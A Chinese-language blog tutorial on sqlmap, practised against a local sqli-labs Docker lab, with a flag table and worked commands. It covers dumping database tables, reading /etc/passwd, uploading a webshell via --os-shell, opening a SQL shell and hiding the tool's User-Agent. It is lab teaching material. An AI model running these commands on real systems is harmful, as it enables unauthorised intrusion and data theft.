@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - SQLmap使用教程</title>
+        <meta name="description" content="关于sqlmap sqlmap 是一款开源渗透测试工具，可以自动检测和利用 SQL 注入漏洞，并接管数据库服务器。 SQLmap官方文档SQLmap wiki sqlmap安装 kali自带了sqlmap，直接在终端输入sqlmap即可使用。 windows可以直接下载sqlmap，解压后在终端进入sqlmap目录，输…">
+    <link rel="canonical" href="https://the0n3.top/pages/sqlmap/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="SQLmap使用教程">
+    <meta property="og:description" content="关于sqlmap sqlmap 是一款开源渗透测试工具，可以自动检测和利用 SQL 注入漏洞，并接管数据库服务器。 SQLmap官方文档SQLmap wiki sqlmap安装 kali自带了sqlmap，直接在终端输入sqlmap即可使用。 windows可以直接下载sqlmap，解压后在终端进入sqlmap目录，输…">
+    <meta property="og:url" content="https://the0n3.top/pages/sqlmap/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/sqlmap/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="SQLmap使用教程">
+    <meta name="twitter:description" content="关于sqlmap sqlmap 是一款开源渗透测试工具，可以自动检测和利用 SQL 注入漏洞，并接管数据库服务器。 SQLmap官方文档SQLmap wiki sqlmap安装 kali自带了sqlmap，直接在终端输入sqlmap即可使用。 windows可以直接下载sqlmap，解压后在终端进入sqlmap目录，输…">
+        <meta name="twitter:image" content="https://the0n3.top/images/sqlmap/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>SQLmap使用教程</h1>
+    <p>
+        <span class="meta">发布于: 2025-05-27 12:48</span>
+    </p>
+    <div class="post-body">
+        <h2>关于sqlmap</h2>
+<p>sqlmap 是一款开源渗透测试工具，可以自动检测和利用 SQL 注入漏洞，并接管数据库服务器。</p>
+<p>SQLmap官方文档<a href="https://github.com/sqlmapproject/sqlmap/wiki/usage">SQLmap wiki</a></p>
+<h2>sqlmap安装</h2>
+<p>kali自带了sqlmap，直接在终端输入<code>sqlmap</code>即可使用。</p>
+<p>windows可以直接下载<a href="https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.9.zip">sqlmap</a>，解压后在终端进入sqlmap目录，输入<code>python sqlmap.py</code>，需要python环境。</p>
+<h2>sqlmap常用参数</h2>
+<table>
+<thead>
+<tr>
+<th>sqlmap参数</th>
+<th>作用</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-h</td>
+<td>帮助信息</td>
+<td>sqlmap -h</td>
+</tr>
+<tr>
+<td>-u</td>
+<td>指定目标URL</td>
+<td>sqlmap -u "<a href="http://example.com/page.php?id=1">http://example.com/page.php?id=1</a>"</td>
+</tr>
+<tr>
+<td>-r</td>
+<td>从文件中读取HTTP请求</td>
+<td>sqlmap -r "request.txt"</td>
+</tr>
+<tr>
+<td>-d</td>
+<td>直接连接数据库（低版本mysql）</td>
+<td>sqlmap -d "mysql://user:pass@ip/database"</td>
+</tr>
+<tr>
+<td>-D</td>
+<td>指定数据库名</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" -D dbname</td>
+</tr>
+<tr>
+<td>-T</td>
+<td>指定表名</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" -D dbname -T tablename</td>
+</tr>
+<tr>
+<td>-C</td>
+<td>指定列名</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" -D dbname -T tablename -C columnname</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>指定测试参数</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1&amp;page=2">http://example.com/?id=1&amp;page=2</a>" -p id</td>
+</tr>
+<tr>
+<td>-v</td>
+<td>设置详细级别(0-6)</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" -v 3</td>
+</tr>
+<tr>
+<td>--dbms</td>
+<td>指定数据库类型</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --dbms=mysql</td>
+</tr>
+<tr>
+<td>--dbs</td>
+<td>枚举所有数据库</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --dbs</td>
+</tr>
+<tr>
+<td>--current-db</td>
+<td>获取当前数据库名</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --current-db</td>
+</tr>
+<tr>
+<td>--tables</td>
+<td>枚举数据库中的表</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" -D dbname --tables</td>
+</tr>
+<tr>
+<td>--columns</td>
+<td>枚举表中的列</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" -D dbname -T tablename --columns</td>
+</tr>
+<tr>
+<td>--dump</td>
+<td>导出表中数据</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" -D dbname -T tablename --dump</td>
+</tr>
+<tr>
+<td>--cookie</td>
+<td>指定cookie值</td>
+<td>sqlmap -u "<a href="http://example.com/">http://example.com/</a>" --cookie="PHPSESSID=value"</td>
+</tr>
+<tr>
+<td>--data</td>
+<td>POST数据</td>
+<td>sqlmap -u "<a href="http://example.com/login.php">http://example.com/login.php</a>" --data="user=admin&amp;pass=admin"</td>
+</tr>
+<tr>
+<td>--level</td>
+<td>设置检测级别(1-5)</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --level=3</td>
+</tr>
+<tr>
+<td>--risk</td>
+<td>设置风险级别(1-3)</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --risk=2</td>
+</tr>
+<tr>
+<td>--batch</td>
+<td>自动化探测，交互过程使用默认参数</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --batch</td>
+</tr>
+<tr>
+<td>--flush-session</td>
+<td>刷新会话数据</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --flush-session</td>
+</tr>
+<tr>
+<td>--random-agent</td>
+<td>随机User-Agent</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --random-agent</td>
+</tr>
+<tr>
+<td>--technique</td>
+<td>指定SQL注入技术</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --technique=BEU</td>
+</tr>
+<tr>
+<td>--hex</td>
+<td>使用十六进制编码</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --hex</td>
+</tr>
+<tr>
+<td>--file-read</td>
+<td>读取服务器文件</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --file-read=/etc/passwd</td>
+</tr>
+<tr>
+<td>--os-shell</td>
+<td>获取交互式系统shell</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --os-shell</td>
+</tr>
+<tr>
+<td>--sql-shell</td>
+<td>获取交互式SQL shell</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --sql-shell</td>
+</tr>
+<tr>
+<td>--time-sec</td>
+<td>设置延时注入时间</td>
+<td>sqlmap -u "<a href="http://example.com/?id=1">http://example.com/?id=1</a>" --technique=T --time-sec=10</td>
+</tr>
+</tbody>
+</table>
+<p>一般是单字参数使用<code>-</code>，多字符参数使用<code>--</code></p>
+<h2>靶场环境部署</h2>
+<p>使用docker部署一个sqli-labs靶场环境。</p>
+<pre><code class="language-bash">docker pull acgpiano/sqli-labs
+docker run -dt --name sqli-lab -p 8080:80 acgpiano/sqli-labs:latest</code></pre>
+<p>访问 <a href="http://ip:8080/">http://ip:8080/</a> 即可进入靶场。</p>
+<h2>sqlmap使用</h2>
+<p>开始前的建议：建议先尝试手注完成<code>sqli-labs</code>整个靶场，掌握基本的手注原理</p>
+<h3>-u,-p,-v,--batch</h3>
+<p>进入less-1，这是一个GET请求方式的单引号类型sql注入点</p>
+<pre>
+-u     指定目标URL
+-p     指定测试参数，如果待测试参数为get类型，且出现在-u的url中时，-p可以省略
+-v     设置日志级别(0-6)，默认使用-v 1，可以省略
+--batch  自动化探测，交互过程使用默认参数
+</pre>
+<p>先尝试手注，发现是单引号类型，猜测后台语句</p>
+<p><img src="/images/sqlmap/1.png" alt="1" decoding="async" width="1454" height="425"></p>
+<pre><code class="language-sql">$sql = "SELECT * FROM users WHERE id = '$_GET[id]'";</code></pre>
+<p>使用sqlmap进行测试</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1"</code></pre>
+<p>sqlmap执行过程会出现交互过程，供用户选择参数，可以执行回车，使用默认参数</p>
+<p>过程的交互提示类似：</p>
+<pre><code class="language-plaintext"># 检测到后台是mysql，是否跳过其他类型数据库的测试
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
+# 是否跳过其他类型的注入测试
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
+# 检测到GET参数'id'存在注入漏洞，是否跳过测试其他参数
+# 也是关键提示，提示是否检测到当前参数存在sql注入漏洞
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]</code></pre>
+<p>你也可以使用<code>--batch</code>参数，跳过交互过程，过程会全部使用默认参数。</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" --batch</code></pre>
+<p>sqlmap的结尾有这样的内容，意思是，这个注入点可以使用<code>联合注入，报错注入，时间盲注，布尔盲注</code>四种方式</p>
+<p><img src="/images/sqlmap/2.png" alt="2" decoding="async" loading="lazy" width="932" height="449"></p>
+<p>同时，末尾还给出了探测到的信息</p>
+<pre><code class="language-plaintext">[13:39:34] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.5.9, Apache 2.4.7
+back-end DBMS: MySQL &gt;= 5.5</code></pre>
+<p>在上面的命令中，会识别使用默认的参数<code>-p id</code>、<code>-v 1</code>，所以上面命令也等效于下面这个</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id -v 1 --batch</code></pre>
+<p>sqlmap的特征？SQLmap在进行http请求时，UA头使用了<code>User-Agent: sqlmap/1.9.3.2#dev (https://sqlmap.org)</code></p>
+<h3>-v,--flush-session,--random-agent</h3>
+<p>觉得<code>-v</code>参数可以单独拿出来说说</p>
+<pre>
+0：仅显示 Python 回溯、错误和关键消息。
+1：同时显示信息和警告消息，默认级别。
+2：显示DEBUG 调试消息。
+3：显示注入的payload。
+4：显示详细 HTTP 请求。
+5：显示 HTTP 响应的标头。
+6：显示服务器 HTTP 响应的页面内容。
+</pre>
+<p>这里讲讲<code>-v</code>、<code>--flush-session</code>和<code>--random-agent</code>的使用</p>
+<pre>
+-v n   其中-v 2可以表示为-vv
+--flush-session  刷新会话数据，清除之前的会话数据
+--random-agent  随机User-Agent
+</pre>
+<p>由于上面已经对<code>less-1</code>进行了测试，sqlmap会有缓存文件，再测试这个站点时，会直接使用测试过的环境，这里为了验证这些参的作用，就先清除缓存</p>
+<p>在<code>-v</code>参数使用2级时，可以看到sqlmap测试时的细节，跳过了其他类型的数据库</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id -vv --flush-session --batch</code></pre>
+<p><img src="/images/sqlmap/3.png" alt="3" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p>在<code>-v</code>参数使用3级时，可以看到sqlmap测试过程使用的payload</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id -v 3 --flush-session --batch</code></pre>
+<p><img src="/images/sqlmap/4.png" alt="4" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p>在<code>-v</code>参数使用4级时，可以看到sqlmap测试过程使用的HTTP请求详细信息，其中ua头里的sqlmap字段算是特征</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id -v 4 --flush-session --batch</code></pre>
+<p><img src="/images/sqlmap/5.png" alt="5" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p>在<code>-v</code>参数使用5级时，可以看到sqlmap测试过程中，发送一个请求，返回一个响应的HTTP头信息</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id -v 5 --flush-session --batch</code></pre>
+<p><img src="/images/sqlmap/6.png" alt="6" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p>在<code>-v</code>参数使用6级时，可以看到sqlmap测试过程中，还返回了页面的内容</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id -v 6 --flush-session --batch</code></pre>
+<p><img src="/images/sqlmap/7.png" alt="7" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p>使用<code>--random-agent</code>参数，可以随机生成一个User-Agent，避免被网站识别到是sqlmap的特征，使用-v 4，可以看到请求头中随机生成的User-Agent字段</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id -v 4 --flush-session --random-agent --batch</code></pre>
+<p><img src="/images/sqlmap/8.png" alt="8" decoding="async" loading="lazy" width="1113" height="626"></p>
+<h3>--dbs,--tables,--columns,--dump,-D,-T,-C</h3>
+<p>这里的参数在上面sqlmap探测出参数存在漏洞时，就可以指定这些参数，拿到数据库数据</p>
+<pre>
+--dbs  获取数据库列表
+--tables  获取指定数据库的表列表
+--columns  获取指定数据库指定表的列名
+--dump  获取指定数据库指定表的列数据
+-D  指定数据库
+-T  指定表
+-C  指定列
+</pre>
+<p>爆出所有数据库</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id --dbs --flush-session --batch</code></pre>
+<p><img src="/images/sqlmap/9.png" alt="9" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p>使用<code>-D</code>参数指定数据库<code>security</code>，使用<code>--tables</code>参数获取表列表</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id -D security --tables --flush-session --batch</code></pre>
+<p><img src="/images/sqlmap/10.png" alt="10" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p>使用<code>-T</code>参数指定<code>users</code>表，使用<code>--columns</code>参数获取列名</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id -D security -T users --columns --flush-session --batch</code></pre>
+<p><img src="/images/sqlmap/11.png" alt="11" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p>使用<code>--dump</code>，脱出指定表的数据</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id -D security -T users --dump --flush-session --batch</code></pre>
+<p><img src="/images/sqlmap/12.png" alt="12" decoding="async" loading="lazy" width="1113" height="626"></p>
+<h3>--dbms,--technique,--no-cast,--hex</h3>
+<p>在最初，尝试手注测试时，可以看到报错是mysql，同时，页面存在可控的回显位</p>
+<p>那么就可以通过指定<code>--dbms</code>参数，指定数据库类型为mysql，跳过其他数据库类型的检测，使用<code>--technique</code>参数，页面存在回显位，指定注入方式为联合注入</p>
+<p><img src="/images/sqlmap/14.png" alt="14" decoding="async" loading="lazy" width="1174" height="449"></p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" --dbms=mysql --technique=U --dbs --flush-session --batch</code></pre>
+<p>sqlmap提示找到了注入点，给出了测试payload，但是后面说，在测试过程，没有拿到<code>--dbs</code>参数的结果，页面没有返回结果</p>
+<p>但是可以使用<code>--no-cast</code>或者<code>--hex</code>参数，关闭mysql的类型转换或编码绕过。</p>
+<p><img src="/images/sqlmap/15.png" alt="15" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p>通过把<code>-v</code>参数指定为6级，看看页面返回内容</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" --dbms=mysql --technique=U --dbs --flush-session --batch -v 6</code></pre>
+<p>老版本 MySQL 没有自动字符集转换机制，sqlmap的payload不兼容，mysql报错。</p>
+<pre><code class="language-plaintext">&lt;font color= "#FFFF00"&gt;Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,IMPLICIT) for operation 'UNION'&lt;/font&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</code></pre>
+<p><img src="/images/sqlmap/16.png" alt="16" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p>尝试使用<code>--no-cast</code>参数，关闭mysql的类型转换，拿到数据</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" --dbms=mysql --technique=U --dbs --flush-session --batch --no-cast</code></pre>
+<p><img src="/images/sqlmap/17.png" alt="17" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p>尝试使用<code>--hex</code>参数，使用十六进制编码绕过，也可以拿到数据</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" --dbms=mysql --technique=U --dbs --flush-session --batch --hex</code></pre>
+<p><img src="/images/sqlmap/18.png" alt="18" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p><strong>technique</strong>参数还可以使用其他注入方式，<code>B</code>表示布尔盲注，<code>E</code>表示报错注入，<code>T</code>表示时间盲注</p>
+<p>这道题比较简单，多种注入姿势都是可以的</p>
+<p>速度排序：联合注入（U） &gt; 报错注入（E） &gt; 布尔盲注（B） &gt; 时间盲注（T）</p>
+<p>报错注入（E）：</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" --dbms=mysql --technique=E --dbs --flush-session --batch</code></pre>
+<p>布尔盲注（B）：</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" --dbms=mysql --technique=B --dbs --flush-session --batch</code></pre>
+<p>时间盲注（T）：</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" --dbms=mysql --technique=T --dbs --flush-session --batch</code></pre>
+<h3>--forms,--data,-r</h3>
+<p>这里使用<code>Less-11</code>，这是一个POST请求方式的单引号类型sql注入点</p>
+<pre>
+--forms  自动检测表单注入点
+--data   指定POST数据
+--r      从抓到的http包中提取参数
+</pre>
+<p>使用<code>--forms</code>参数，把工作直接交给sqlmap，让sqlmap自己探测要提交的表单参数，指定探测参数uname、联合注入，hex编码结果</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-11/?id=1" --dbms=mysql --forms -p uname --dbs --technique=U --flush-session --batch --hex</code></pre>
+<p>使用<code>--data</code>参数，指定POST数据，使用<code>-p</code>参数指定探测参数uname，在windows平台怪怪的，<code>&amp;</code>字符有特殊语义</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-11/?id=1" --dbms=mysql --data="passwd=1&amp;submit=Submit&amp;uname=1" -p uname --dbs --technique=U --flush-session --batch --hex</code></pre>
+<p>使用<code>-r</code>参数，从抓到的http包中提取参数，使用<code>-p</code>参数指定探测参数uname</p>
+<p>先用burp抓个包，保存到一个txt文件里</p>
+<p><img src="/images/sqlmap/21.png" alt="21" decoding="async" loading="lazy" width="868" height="444"></p>
+<p>复制文件的路径</p>
+<p><img src="/images/sqlmap/22.png" alt="22" decoding="async" loading="lazy" width="1016" height="529"></p>
+<p>使用sqlmap <code>-r</code>参数，指定抓包文件路径，使用<code>-p</code>参数指定探测参数uname</p>
+<pre><code class="language-bash">sqlmap -r "f:\\Desktop\\slq.txt" --dbms=mysql -p uname --dbs --technique=U --flush-session --batch --hex</code></pre>
+<p><img src="/images/sqlmap/23.png" alt="23" decoding="async" loading="lazy" width="1113" height="626"></p>
+<h3>--file-read,--os-shell,--sql-shell,--output-dir</h3>
+<p>回到<code>Less-1</code>这一关演示。</p>
+<pre>
+--file-read  读取服务器文件（使用了mysql的load_file函数）
+--os-shell   获得一个交互的shell（上传一个webshell，在结束命令执行时，删除自身）
+--sql-shell  获得一个交互的sqlshell（可以执行sql语句）
+</pre>
+<p>使用<code>--file-read</code>参数，读取服务器文件</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id --dbms=mysql --file-read=/etc/passwd --flush-session --batch</code></pre>
+<p>读取成功，使用了16进制进行了一次编码，同时保存了一份解码文件在本地的C盘用户目录下</p>
+<p><img src="/images/sqlmap/24.png" alt="24" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p>可以使用<code>--output-dir</code>参数，指定输出目录在桌面，我的终端在桌面打开的，直接指定当前目录了</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id --dbms=mysql --file-read=/etc/passwd --flush-session --batch --output-dir=./</code></pre>
+<p><img src="/images/sqlmap/25.png" alt="25" decoding="async" loading="lazy" width="922" height="605"></p>
+<p>尝试写入webshell，这个靶场有点问题，进入docker内，授权写权限</p>
+<pre><code class="language-bash">docker exec -it sqli-lab /bin/sh
+chmod 777 -R /var/www/html/</code></pre>
+<p>使用<code>--os-shell</code>参数，获得一个交互的shell，</p><p color="red">注意：这个过程会上传webshell，如果你需要手动指定目录时，不要使用--batch参数，如果是常见的/var/www/html/目录，sqlmap可以自动尝试上传到这个目录下</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id --dbms=mysql --os-shell --flush-session --batch</code></pre>
+<p>退出这个webshell后，这个webshell会自动删除自身</p>
+<p><img src="/images/sqlmap/26.png" alt="26" decoding="async" loading="lazy" width="1113" height="626"></p>
+<p>使用<code>--sql-shell</code>参数，获得一个交互的sqlshell</p>
+<pre><code class="language-bash">sqlmap -u "http://192.168.6.112:8080/Less-1/?id=1" -p id --dbms=mysql --sql-shell --flush-session --batch</code></pre>
+<p>拿到了sqlshell，可以执行sql语句，当前是mysql的root用户</p>
+<p><img src="/images/sqlmap/27.png" alt="27" decoding="async" loading="lazy" width="1113" height="626"></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>SQL注入</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#web</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
